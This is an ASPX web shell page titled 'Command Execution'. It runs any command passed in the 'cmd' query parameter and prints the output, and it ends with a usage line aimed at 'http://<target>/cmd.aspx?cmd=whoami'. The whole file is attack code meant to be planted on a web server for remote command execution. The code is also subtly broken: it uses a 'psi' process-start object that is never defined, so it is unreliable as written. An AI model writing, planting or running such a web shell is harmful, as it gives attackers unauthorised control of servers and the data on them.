<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {


            Process process = Process.Start(psi);
            StreamReader reader = process.StandardOutput;
            string output = reader.ReadToEnd();
            Response.Write("<pre>" + output + "</pre>");
        }
        else
        {
            Response.Write("Usage: ?cmd=whoami");
        }
    }
</script>
<!DOCTYPE html>
<html>
<head>
    <title>ASPX Command Execution</title>
</head>
<body>
    <h1>Command Execution</h1>
</body>
</html>

# Example Usage:http://<target>/cmd.aspx?cmd=whoami
